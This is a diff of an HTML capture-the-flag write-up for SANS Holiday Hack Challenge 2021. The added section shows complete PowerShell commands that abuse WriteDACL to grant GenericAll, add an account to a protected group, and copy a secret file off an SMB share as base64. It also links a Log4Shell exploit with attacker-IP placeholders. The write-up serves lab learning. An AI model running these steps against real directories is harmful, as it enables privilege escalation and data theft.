+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\remote_elf
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+</code></pre>
+
+<h3 id="add-genericall-to-remote_elf-account">
+<a class="anchor" href="#add-genericall-to-remote_elf-account" aria-hidden="true"><span class="octicon octicon-link"></span></a>Add GenericAll to remote_elf Account</h3>
+
+<p>In the next step add GenericAll Permission to your account. For this we have to use the already compromised remote_elf account.
+Exit the current DC Powershell session and enter remote_elf session again:</p>
+
+<pre><code class="powershell">[DC01.ELFU.LOCAL]: PS C:\Users\remote_elf\Documents&gt; exit
+PS /home/euisvijnqm&gt; Enter-PSSession -ComputerName 10.128.1.53 -Credential $aCred -Authentication Negotiate
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; 
+</code></pre>
+
+<p>Here use the <a href="https://github.com/chrisjd20/hhc21_powershell_snippets#in-the-below-example-the-genericall-permission-for-the-chrisd-user-to-the-domain-admins-group-if-the-user-your-running-it-under-has-the-writedacl-permission-on-the-domain-admins-group" target="_blank" rel="noopener noreferrer">Github snippet</a>:</p>
+
+<pre><code class="powershell">[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; Add-Type -AssemblyName System.DirectoryServices
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $username = "euisvijnqm"
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $nullGUID = [guid]'00000000-0000-0000-0000-000000000000'
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $propGUID = [guid]'00000000-0000-0000-0000-000000000000'
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $IdentityReference = (New-Object System.Security.Principal.NTAccount("elfu.local\$username")).Translate([System.Security.Principal.SecurityIdentifier])
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $inheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference, ([System.DirectoryServices.ActiveDirectoryRights] "GenericAll"), ([System.Security.AccessControl.AccessControlType] "Allow"), $propGUID, $inheritanceType, $nullGUID
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $secOptions = $domainDirEntry.get_Options()
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $secOptions.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.RefreshCache()
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.get_ObjectSecurity().AddAccessRule($ACE)
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.CommitChanges()
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.dispose()
+</code></pre>
+
+<p>Check it:</p>
+
+<pre><code class="bash">[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $ADSI = [ADSI]"LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $ADSI.psbase.ObjectSecurity.GetAccessRules($true,$true,[Security.Principal.NTAccount])
+</code></pre>
+
+<p>yields:</p>
+
+<pre><code class="bash">
+...
+ActiveDirectoryRights : GenericAll
+InheritanceType       : None
+ObjectType            : 00000000-0000-0000-0000-000000000000
+InheritedObjectType   : 00000000-0000-0000-0000-000000000000
+ObjectFlags           : None
+AccessControlType     : Allow
+IdentityReference     : ELFU\euisvijnqm
+IsInherited           : False
+InheritanceFlags      : None
+PropagationFlags      : None
+...
+</code></pre>
+
+<h3 id="add-your-account-to-research-department-group">
+<a class="anchor" href="#add-your-account-to-research-department-group" aria-hidden="true"><span class="octicon octicon-link"></span></a>Add your account to Research Department group</h3>
+
+<p>Finally you have to <a href="https://github.com/chrisjd20/hhc21_powershell_snippets#after-giving-genericall-permissions-over-the-domain-admins-group-the-below-snippet-would-add-the-chrisjd-account-to-the-domain-admins-group" target="_blank" rel="noopener noreferrer">add</a> your account to the Research Department group:</p>
+
+<pre><code class="powershell">[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.CommitChanges()
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; Add-Type -AssemblyName System.DirectoryServices
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $username = 'euisvijnqm'
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $password = 'Szpbpjuqs@'
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry = New-Object System.DirectoryServices.DirectoryEntry $ldapConnString, $username, $password
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $user = New-Object System.Security.Principal.NTAccount("elfu.local\$username")
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $sid=$user.Translate([System.Security.Principal.SecurityIdentifier])
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $b=New-Object byte[] $sid.BinaryLength
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $sid.GetBinaryForm($b,0)
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $hexSID=[BitConverter]::ToString($b).Replace('-','')
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.Add("LDAP://&lt;SID=$hexSID&gt;")
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.CommitChanges()
+[10.128.1.53]: PS C:\Users\remote_elf\Documents&gt; $domainDirEntry.dispose()
+</code></pre>
+
+<h3 id="retrieve-document-from-research-share">
+<a class="anchor" href="#retrieve-document-from-research-share" aria-hidden="true"><span class="octicon octicon-link"></span></a>Retrieve document from research share</h3>
+
+<p>Give the permissions changes 5 minutes to propagate. Then connect and retrieve the secret document from the research department share:</p>
+
+<pre><code class="bash">smbclient -U euisvijnqm //10.128.3.30/research_dep
+Enter WORKGROUP\euisvijnqm's password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                             D        0  Thu Dec  2 16:39:42 2021
+  ..                                            D        0  Fri Jan 21 08:02:40 2022
+  SantaSecretToAWonderfulHolidaySeason.pdf      N   173932  Thu Dec  2 16:38:26 2021
+
+		41089256 blocks of size 1024. 34798856 blocks available
+smb: \&gt; mget SantaSecretToAWonderfulHolidaySeason.pdf
+Get file SantaSecretToAWonderfulHolidaySeason.pdf? yes
+getting file \SantaSecretToAWonderfulHolidaySeason.pdf of size 173932 as SantaSecretToAWonderfulHolidaySeason.pdf (42462.8 KiloBytes/sec) (average 42463.9 KiloBytes/sec)
+smb: \&gt; exit
+</code></pre>
+
+<p>Get the base64:</p>
+
+<pre><code class="bash">cat SantaSecretToAWonderfulHolidaySeason.pdf | base64 | tr -d '\n'
+JVBERi0xLjMKJcTl8uXrp/Og0MT
+...
+PgpzdGFydHhyZWYKMTczMzMyCiUlRU9GCg=
+</code></pre>
+
+<p>Copy it into a file base64out at your system (using vim can be faster then using echo):</p>
+
+<pre><code class="bash">cat base64out| base64 --decode &gt; SantaSecretToAWonderfulHolidaySeason.pdf 
+</code></pre>
+
+<pre><code class="bash">file SantaSecretToAWonderfulHolidaySeason.pdf 
+SantaSecretToAWonderfulHolidaySeason.pdf: PDF document, version 1.3
+</code></pre>
+
+<p>Open the PDF</p>
+
+<p><img src="/blog/assets/img/hhc/2021/08_1000_Final_PDF.png" width="100%" alt="Final PDF"></p>
+
+<p>The first word in the list and therefore the solution is <em>Kindness</em></p>
+
 <h2 id="9---splunk">
 <a class="anchor" href="#9---splunk" aria-hidden="true"><span class="octicon octicon-link"></span></a>9 - Splunk</h2>
 
@@ -774,8 +1421,7 @@ Troll_Pay_Chart.xlsx
 <h4 id="level-1-1">
 <a class="anchor" href="#level-1-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Level 1</h4>
 
-<pre><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie | stats count by CommandLine | sort - count
-</code></pre>
+<pre><code>index=main sourcetype=journald source=Journald:Microsoft-Windows-Sysmon/Operational EventCode=1 user=eddie | stats count by CommandLine | sort - count</code></pre>
 
 <p>from there you can get</p>
 <pre><code class="bash">git status</code></pre>
@@ -1300,8 +1946,9 @@ Goto console and set single_player_mode=true
 <a class="anchor" href="#bonus-red-log4jack" aria-hidden="true"><span class="octicon octicon-link"></span></a>Bonus Red Log4jack</h2>
 
 <p>Follow all the steps in <a href="https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4" target="_blank" rel="noopener noreferrer">https://gist.github.com/joswr1ght/fb361f1f1e58307048aae5c0f38701e4</a> 
-and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (<code class="language-plaintext highlighter-rouge">ip a</code>)
-Answer text from <code class="language-plaintext highlighter-rouge">/home/solr/kringle.txt</code> is</p>
+and replace WEBSERVERIP, NETCATIP and MARSHALSECIP with your ip (<code class="language-plaintext highlighter-rouge">ip a</code>).</p>
+
+<p>Answer text from <code class="language-plaintext highlighter-rouge">/home/solr/kringle.txt</code> is</p>
 <pre><code>"""
 The solution to Log4shell is patching
 Sincerely,
